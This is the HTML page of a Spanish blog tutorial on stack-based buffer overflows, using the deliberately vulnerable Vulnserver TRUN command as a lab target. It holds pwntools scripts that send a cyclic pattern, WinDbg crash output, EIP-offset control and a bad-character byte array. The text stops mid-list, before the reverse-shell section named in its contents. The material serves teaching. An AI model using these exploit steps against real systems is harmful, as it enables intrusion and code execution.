<!DOCTYPE html>

<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="color-scheme" content="light dark">
  
  
    
  
  <meta name="description" content="My blog site.">

  <title>Stack-Based Buffer Overflow</title>
  <link rel="icon" type="image/png" sizes="32x32" href="https://dreamer-r3.github.io/img/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="https://dreamer-r3.github.io/img/favicon-16x16.png">
  <link rel="apple-touch-icon" sizes="180x180" href="https://dreamer-r3.github.io/img/apple-touch-icon.png">
  
  <style>

  /* light mode colors */
  body {
    --primary-color: #5871a2;
    --primary-pale-color: #5871a233;
    --primary-decoration-color: #5871a210;
    --bg-color: #ffffff;
    --text-color: #2f3030;
    --text-pale-color: #767676;
    --text-decoration-color: #a9a9a9;
    --highlight-mark-color: #5f75b020;

    --callout-note-color: #5871a2;
    --callout-tip-color: #268556;
    --callout-important-color: #885fc9;
    --callout-warning-color: #ab6632;
    --callout-caution-color: #c64e4e;
  }

  /* dark mode colors */
  body.dark {
    --primary-color: #6f8fd1;
    --primary-pale-color: #6f8fd166;
    --primary-decoration-color: #6f8fd112;
    --bg-color: #1c1c1c;
    --text-color: #c1c1c1;
    --text-pale-color: #848484;
    --text-decoration-color: #5f5f5f;
    --highlight-mark-color: #8296cb3b;

    --callout-note-color: #6f8fd1;
    --callout-tip-color: #47976f;
    --callout-important-color: #9776cd;
    --callout-warning-color: #ad7a52;
    --callout-caution-color: #d06161;
  }

  /* typography */
  body {
    --main-font: ui-sans-serif, system-ui, sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
    --code-font: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, 'Liberation Mono', 'Courier New', monospace;
    --homepage-max-width: 768px;
    --main-max-width: 768px;
    --avatar-size: 60px;
    --font-size: 16px;
    --line-height: 1.75;
    --img-border-radius: 0px;
    --detail-border-radius: 0px;
    --dark-mode-img-brightness: 0.75;
    --dark-mode-chart-brightness: 0.75;
    --inline-code-border-radius: 2px;
    --inline-code-bg-color: var(--primary-decoration-color);
    --block-code-border-radius: 0px;
    --block-code-border-color: var(--primary-color);
    --detail-border-color: var(--primary-color);
  }

</style>

  <link rel="stylesheet" href="https://dreamer-r3.github.io/main.css">
  

<link id="hl" rel="stylesheet" type="text/css" href="/hl-light.css" />



  
</head>

<body class="post">
  
  <script>
    const theme = sessionStorage.getItem('theme');
    const match = window.matchMedia("(prefers-color-scheme: dark)").matches
    if ((theme && theme == 'dark') || (!theme && match)) {
      document.body.classList.add('dark');
      const hl = document.querySelector('link#hl');
      if (hl) hl.href = 'https://dreamer-r3.github.io/hl-dark.css';
    }
  </script>
  
  
<div id="wrapper">
  <div id="blank"></div>
  <aside>
    
    
    <nav>
      <ul>
        
        <li>
          <a class="h2" href="#como-se-explota-un-buffer-overflow">Cómo se explota un Buffer overflow</a>
          
        </li>
        
        <li>
          <a class="h2" href="#controlando-eip">Controlando EIP</a>
          
        </li>
        
        <li>
          <a class="h2" href="#buscando-badchars">Buscando badchars</a>
          
        </li>
        
        <li>
          <a class="h2" href="#narly-jmp-esp">Narly &amp; JMP ESP</a>
          
        </li>
        
        <li>
          <a class="h2" href="#shell-inversa">Shell inversa</a>
          
        </li>
        
      </ul>
    </nav>
    
    
    <button id="back-to-top" aria-label="back to top">
      
      <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-up"><line x1="12" y1="19" x2="12" y2="5"></line><polyline points="5 12 12 5 19 12"></polyline></svg>

    </button>
    
  </aside>
  <main>
    
<header>
  <nav>
    <a id="back-link" href="https:&#x2F;&#x2F;dreamer-r3.github.io&#x2F;posts">← Back</a>
  </nav>
</header>


    <div>
      
      
      
      
      <div id="copy-cfg" style="display: none;" data-copy-icon="&lt;svg xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&quot; viewBox=&quot;0 0 24 24&quot; width=&quot;18&quot; height=&quot;18&quot;&gt;&lt;path d=&quot;M6.9998 6V3C6.9998 2.44772 7.44752 2 7.9998 2H19.9998C20.5521 2 20.9998 2.44772 20.9998 3V17C20.9998 17.5523 20.5521 18 19.9998 18H16.9998V20.9991C16.9998 21.5519 16.5499 22 15.993 22H4.00666C3.45059 22 3 21.5554 3 20.9991L3.0026 7.00087C3.0027 6.44811 3.45264 6 4.00942 6H6.9998ZM5.00242 8L5.00019 20H14.9998V8H5.00242ZM8.9998 6H16.9998V16H18.9998V4H8.9998V6Z&quot; fill=&quot;currentColor&quot;&gt;&lt;&#x2F;path&gt;&lt;&#x2F;svg&gt;
" data-check-icon="&lt;svg xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&quot; viewBox=&quot;0 0 24 24&quot; width=&quot;18&quot; height=&quot;18&quot;&gt;&lt;path d=&quot;M10.0007 15.1709L19.1931 5.97852L20.6073 7.39273L10.0007 17.9993L3.63672 11.6354L5.05093 10.2212L10.0007 15.1709Z&quot; fill=&quot;currentColor&quot;&gt;&lt;&#x2F;path&gt;&lt;&#x2F;svg&gt;
"></div>
      
      <article class="prose">
        <h1>Stack-Based Buffer Overflow</h1>
        <div id="post-info">
          <div id="date">
            <span id="publish">Nov 11, 2025</span>
            </div>

          
          <div id="tags">
            <a class="instant" href="https://dreamer-r3.github.io//tags/exploiting"><span>#</span>exploiting</a>
          </div>
          
        </div>

        
        

        

        <p>Un desbordamiento de <strong>Búfer</strong> basado en la pila, ocurre cuando un programa asigna un tamaño de memoria X, y este es sobrepasado por la cantidad de información que se manda, pudiendo sobrescribir parte de la memoria adyacente.</p>
<p>El siguiente snippet de código muestra un ejemplo de como un búfer tiene un tamaño estático.</p>
<p>La función principal define primero una matriz de caracteres llamada buffer con capacidad para hasta 80 caracteres. Dado que esta variable está definida dentro de una función, el compilador la tratará como una variable local y se la reservará un tamaño de 80 bytes en la pila.</p>
<pre data-lang="c" class="language-c z-code"><code class="language-c" data-lang="c"><span class="z-source z-c"><span class="z-meta z-preprocessor z-include z-c"><span class="z-keyword z-control z-import z-include z-c">#include</span> <span class="z-string z-quoted z-other z-lt-gt z-include z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&lt;</span>stdio.h<span class="z-punctuation z-definition z-string z-end z-c">&gt;</span></span>
</span></span><span class="z-source z-c"><span class="z-meta z-preprocessor z-include z-c"><span class="z-keyword z-control z-import z-include z-c">#include</span> <span class="z-string z-quoted z-other z-lt-gt z-include z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&lt;</span>string.h<span class="z-punctuation z-definition z-string z-end z-c">&gt;</span></span>
</span></span><span class="z-source z-c">
</span><span class="z-source z-c"><span class="z-storage z-type z-c">int</span> <span class="z-meta z-function z-c"><span class="z-entity z-name z-function z-c">main</span></span><span class="z-meta z-function z-parameters z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function z-parameters z-c"><span class="z-meta z-group z-c"><span class="z-storage z-type z-c">int</span> <span class="z-variable z-parameter z-c">argc</span><span class="z-punctuation z-separator z-c">,</span> <span class="z-storage z-type z-c">char</span> <span class="z-keyword z-operator z-c">*</span> <span class="z-variable z-parameter z-c">argv</span><span class="z-meta z-brackets z-c"><span class="z-punctuation z-section z-brackets z-begin z-c">[</span><span class="z-punctuation z-section z-brackets z-end z-c">]</span></span><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span><span class="z-meta z-function z-c">
</span></span><span class="z-source z-c"><span class="z-meta z-function z-c"></span><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-begin z-c">{</span></span></span><span class="z-meta z-function z-c"><span class="z-meta z-block z-c">
</span></span></span><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c">	buffer<span class="z-meta z-brackets z-c"><span class="z-punctuation z-section z-brackets z-begin z-c">[</span><span class="z-constant z-numeric z-integer z-decimal z-c">80</span><span class="z-punctuation z-section z-brackets z-end z-c">]</span></span><span class="z-punctuation z-terminator z-c">;</span>
</span></span></span><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c">
</span></span></span><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c">	<span class="z-keyword z-control z-c">if</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>argc <span class="z-keyword z-operator z-comparison z-c">&lt;</span> <span class="z-constant z-numeric z-integer z-decimal z-c">2</span><span class="z-punctuation z-section z-group z-end z-c">)</span></span>
</span></span></span><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c">	<span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-begin z-c">{</span>
</span></span></span></span><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">		<span class="z-meta z-function-call z-c"><span class="z-support z-function z-C99 z-c">printf</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-string z-quoted z-double z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&quot;</span>Error: debe proporcionar al menos un argumento<span class="z-constant z-character z-escape z-c">\n</span><span class="z-punctuation z-definition z-string z-end z-c">&quot;</span></span></span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span><span class="z-punctuation z-terminator z-c">;</span>
</span></span></span></span><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">		<span class="z-keyword z-control z-flow z-return z-c">return</span> <span class="z-constant z-numeric z-integer z-decimal z-c">1</span><span class="z-punctuation z-terminator z-c">;</span>
</span></span></span></span><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">	<span class="z-punctuation z-section z-block z-end z-c">}</span></span>
</span></span></span><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c">
</span></span></span><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c">	<span class="z-meta z-function-call z-c"><span class="z-support z-function z-C99 z-c">strcpy</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c">buffer<span class="z-punctuation z-separator z-c">,</span> argv<span class="z-meta z-brackets z-c"><span class="z-punctuation z-section z-brackets z-begin z-c">[</span><span class="z-constant z-numeric z-integer z-decimal z-c">1</span><span class="z-punctuation z-section z-brackets z-end z-c">]</span></span></span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span><span class="z-punctuation z-terminator z-c">;</span>
</span></span></span><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c">	<span class="z-keyword z-control z-flow z-return z-c">return</span> <span class="z-constant z-numeric z-integer z-decimal z-c">0</span><span class="z-punctuation z-terminator z-c">;</span>
</span></span></span><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"></span></span><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-end z-c">}</span></span></span>
</span></code></pre>
<p>El programa procede entonces a copiar (strcpy) el contenido del argumento de línea de comandos dado <code>argv[1]</code> en la matriz de caracteres del búfer. Finalmente, el programa finaliza su ejecución y devuelve cero (código de salida exitosa estándar) al sistema operativo.</p>
<h2 id="como-se-explota-un-buffer-overflow">Cómo se explota un Buffer overflow<a class="zola-anchor" href="#como-se-explota-un-buffer-overflow" aria-label="Anchor link for: como-se-explota-un-buffer-overflow" style="visibility: hidden;"></a>
</h2>
<p>Obviando la parte de ingeniería inversa para detectar la vulnerabilidad, se tomará de ejemplo "Vulnserver",en concreto abusaremos de la función TRUN.</p>
<p>Mandamos un patrón de caracteres que no se repiten para saber cual es el offset exacto en el se empieza a sobrescribir EIP.</p>
<h2 id="controlando-eip">Controlando EIP<a class="zola-anchor" href="#controlando-eip" aria-label="Anchor link for: controlando-eip" style="visibility: hidden;"></a>
</h2>
<p>El esqueleto del exploit, es el siguiente, primero se establece una conexión el servidor a la escucha y después se manda un patrón de 3000 caracteres.</p>
<pre data-lang="python" class="language-python z-code"><code class="language-python" data-lang="python"><span class="z-source z-python"><span class="z-meta z-statement z-import z-python"><span class="z-keyword z-control z-import z-from z-python">from</span></span><span class="z-meta z-statement z-import z-python"><span class="z-meta z-import-source z-python"> <span class="z-meta z-import-path z-python"><span class="z-meta z-import-name z-python">pwn</span></span> <span class="z-meta z-statement z-import z-python"><span class="z-keyword z-control z-import z-python">import</span></span></span></span><span class="z-meta z-statement z-import z-python"></span><span class="z-meta z-statement z-import z-python"> <span class="z-constant z-language z-import-all z-python">*</span></span>
</span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">p</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">remote</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">192.168.1.131<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-separator z-arguments z-python">,</span> <span class="z-constant z-numeric z-integer z-decimal z-python">9999</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
</span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> 3000
</span></span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">payload</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4...<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">buf</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">TRUN . <span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-keyword z-operator z-arithmetic z-python">+</span> <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">payload</span></span>
</span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">p</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">send</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">buf</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
</span><span class="z-source z-python">
</span></code></pre>
<p>En el volcado de winDBG, vemos que hemos provocado una violación de acceso, para comprobar la parte del patrón que es, podemos usar <code>msfpattern</code>.</p>
<pre class="z-code"><code><span class="z-text z-plain">0:003&gt; g
</span><span class="z-text z-plain">(190c.2040): Access violation - code c0000005 (first chance)
</span><span class="z-text z-plain">First chance exceptions are reported before any exception handling.
</span><span class="z-text z-plain">This exception may be expected and handled.
</span><span class="z-text z-plain">eax=00d7f1e8 ebx=000000e0 ecx=00b75370 edx=0000f50c esi=00401848 edi=00401848
</span><span class="z-text z-plain">eip=396f4338 esp=00d7f9c8 ebp=6f43376f iopl=0         nv up ei pl zr na pe nc
</span><span class="z-text z-plain">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
</span><span class="z-text z-plain">396f4338 ??              ???
</span></code></pre>
<p>Después de obtener el offset exacto <code>0x396f4338 = 2006</code>, debemos comprobar que tenemos el control total del registro EIP.</p>
<p>Si todo va bien, EIP, tendrá 4 <code>B's</code> y después <code>ESP</code> contendrá todas las <code>C's</code> que se mandan, ya que este parámetro no tiene restricciones de espacio.</p>
<pre data-lang="python" class="language-python z-code"><code class="language-python" data-lang="python"><span class="z-source z-python"><span class="z-meta z-statement z-import z-python"><span class="z-keyword z-control z-import z-from z-python">from</span></span><span class="z-meta z-statement z-import z-python"><span class="z-meta z-import-source z-python"> <span class="z-meta z-import-path z-python"><span class="z-meta z-import-name z-python">pwn</span></span> <span class="z-meta z-statement z-import z-python"><span class="z-keyword z-control z-import z-python">import</span></span></span></span><span class="z-meta z-statement z-import z-python"></span><span class="z-meta z-statement z-import z-python"> <span class="z-constant z-language z-import-all z-python">*</span></span>
</span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">p</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">remote</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">192.168.1.131<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-separator z-arguments z-python">,</span> <span class="z-constant z-numeric z-integer z-decimal z-python">9999</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
</span><span class="z-source z-python">
</span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">payload</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\x41</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-keyword z-operator z-arithmetic z-python">*</span> <span class="z-constant z-numeric z-integer z-decimal z-python">2006</span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> junk
</span></span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">payload</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\x42</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-keyword z-operator z-arithmetic z-python">*</span> <span class="z-constant z-numeric z-integer z-decimal z-python">4</span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> eip
</span></span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">payload</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\x43</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-keyword z-operator z-arithmetic z-python">*</span> <span class="z-meta z-group z-python"><span class="z-punctuation z-section z-group z-begin z-python">(</span><span class="z-constant z-numeric z-integer z-decimal z-python">3000</span> <span class="z-keyword z-operator z-arithmetic z-python">-</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-support z-function z-builtin z-python">len</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">payload</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span><span class="z-punctuation z-section z-group z-end z-python">)</span></span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> filler
</span></span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">buf</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">TRUN .<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-keyword z-operator z-arithmetic z-python">+</span> <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">payload</span></span>
</span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">p</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">send</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">buf</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
</span></code></pre>
<p>Una vez comprobado que tenemos el control EIP contendrá las 4'Bs , a continuación tenemos que ver que caracteres no interpreta de manera correcta la aplicación en el registro <code>ESP</code>.</p>
<p>¿Pero porqué <code>ESP</code>?, lo  siguiente que va a ejecutar <code>EIP</code> es lo que está en <code>ESP</code>, ya que define el puntero de pila.</p>
<h2 id="buscando-badchars">Buscando badchars<a class="zola-anchor" href="#buscando-badchars" aria-label="Anchor link for: buscando-badchars" style="visibility: hidden;"></a>
</h2>
<pre data-lang="python" class="language-python z-code"><code class="language-python" data-lang="python"><span class="z-source z-python"><span class="z-meta z-statement z-import z-python"><span class="z-keyword z-control z-import z-from z-python">from</span></span><span class="z-meta z-statement z-import z-python"><span class="z-meta z-import-source z-python"> <span class="z-meta z-import-path z-python"><span class="z-meta z-import-name z-python">pwn</span></span> <span class="z-meta z-statement z-import z-python"><span class="z-keyword z-control z-import z-python">import</span></span></span></span><span class="z-meta z-statement z-import z-python"></span><span class="z-meta z-statement z-import z-python"> <span class="z-constant z-language z-import-all z-python">*</span></span>
</span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">p</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">remote</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">192.168.1.131<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-separator z-arguments z-python">,</span> <span class="z-constant z-numeric z-integer z-decimal z-python">9999</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
</span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">badchars</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\x01</span><span class="z-constant z-character z-escape z-hex z-python">\x02</span><span class="z-constant z-character z-escape z-hex z-python">\x03</span><span class="z-constant z-character z-escape z-hex z-python">\x04</span><span class="z-constant z-character z-escape z-hex z-python">\x05</span><span class="z-constant z-character z-escape z-hex z-python">\x06</span><span class="z-constant z-character z-escape z-hex z-python">\x07</span><span class="z-constant z-character z-escape z-hex z-python">\x08</span><span class="z-constant z-character z-escape z-hex z-python">\x09</span><span class="z-constant z-character z-escape z-hex z-python">\x0a</span><span class="z-constant z-character z-escape z-hex z-python">\x0b</span><span class="z-constant z-character z-escape z-hex z-python">\x0c</span><span class="z-constant z-character z-escape z-hex z-python">\x0d</span><span class="z-constant z-character z-escape z-hex z-python">\x0e</span><span class="z-constant z-character z-escape z-hex z-python">\x0f</span><span class="z-constant z-character z-escape z-hex z-python">\x10</span><span class="z-constant z-character z-escape z-hex z-python">\x11</span><span class="z-constant z-character z-escape z-hex z-python">\x12</span><span class="z-constant z-character z-escape z-hex z-python">\x13</span><span class="z-constant z-character z-escape z-hex z-python">\x14</span><span class="z-constant z-character z-escape z-hex z-python">\x15</span><span class="z-constant z-character z-escape z-hex z-python">\x16</span><span class="z-constant z-character z-escape z-hex z-python">\x17</span><span class="z-constant z-character z-escape z-hex z-python">\x18</span><span class="z-constant z-character z-escape z-hex z-python">\x19</span><span class="z-constant z-character z-escape z-hex z-python">\x1a</span><span class="z-constant z-character z-escape z-hex z-python">\x1b</span><span class="z-constant z-character z-escape z-hex z-python">\x1c</span><span class="z-constant z-character z-escape z-hex z-python">\x1d</span><span class="z-constant z-character z-escape z-hex z-python">\x1e</span><span class="z-constant z-character z-escape z-hex z-python">\x1f</span><span class="z-constant z-character z-escape z-hex z-python">\x20</span><span class="z-constant z-character z-escape z-hex z-python">\x21</span><span class="z-constant z-character z-escape z-hex z-python">\x22</span><span class="z-constant z-character z-escape z-hex z-python">\x23</span><span class="z-constant z-character z-escape z-hex z-python">\x24</span><span class="z-constant z-character z-escape z-hex z-python">\x25</span><span class="z-constant z-character z-escape z-hex z-python">\x26</span><span class="z-constant z-character z-escape z-hex z-python">\x27</span><span class="z-constant z-character z-escape z-hex z-python">\x28</span><span class="z-constant z-character z-escape z-hex z-python">\x29</span><span class="z-constant z-character z-escape z-hex z-python">\x2a</span><span class="z-constant z-character z-escape z-hex z-python">\x2b</span><span class="z-constant z-character z-escape z-hex z-python">\x2c</span><span class="z-constant z-character z-escape z-hex z-python">\x2d</span><span class="z-constant z-character z-escape z-hex z-python">\x2e</span><span class="z-constant z-character z-escape z-hex z-python">\x2f</span><span class="z-constant z-character z-escape z-hex z-python">\x30</span><span class="z-constant z-character z-escape z-hex z-python">\x31</span><span class="z-constant z-character z-escape z-hex z-python">\x32</span><span class="z-constant z-character z-escape z-hex z-python">\x33</span><span class="z-constant z-character z-escape z-hex z-python">\x34</span><span class="z-constant z-character z-escape z-hex z-python">\x35</span><span class="z-constant z-character z-escape z-hex z-python">\x36</span><span class="z-constant z-character z-escape z-hex z-python">\x37</span><span class="z-constant z-character z-escape z-hex z-python">\x38</span><span class="z-constant z-character z-escape z-hex z-python">\x39</span><span class="z-constant z-character z-escape z-hex z-python">\x3a</span><span class="z-constant z-character z-escape z-hex z-python">\x3b</span><span class="z-constant z-character z-escape z-hex z-python">\x3c</span><span class="z-constant z-character z-escape z-hex z-python">\x3d</span><span class="z-constant z-character z-escape z-hex z-python">\x3e</span><span class="z-constant z-character z-escape z-hex z-python">\x3f</span><span class="z-constant z-character z-escape z-hex z-python">\x40</span><span class="z-constant z-character z-escape z-hex z-python">\x41</span><span class="z-constant z-character z-escape z-hex z-python">\x42</span><span class="z-constant z-character z-escape z-hex z-python">\x43</span><span class="z-constant z-character z-escape z-hex z-python">\x44</span><span class="z-constant z-character z-escape z-hex z-python">\x45</span><span class="z-constant z-character z-escape z-hex z-python">\x46</span><span class="z-constant z-character z-escape z-hex z-python">\x47</span><span class="z-constant z-character z-escape z-hex z-python">\x48</span><span class="z-constant z-character z-escape z-hex z-python">\x49</span><span class="z-constant z-character z-escape z-hex z-python">\x4a</span><span class="z-constant z-character z-escape z-hex z-python">\x4b</span><span class="z-constant z-character z-escape z-hex z-python">\x4c</span><span class="z-constant z-character z-escape z-hex z-python">\x4d</span><span class="z-constant z-character z-escape 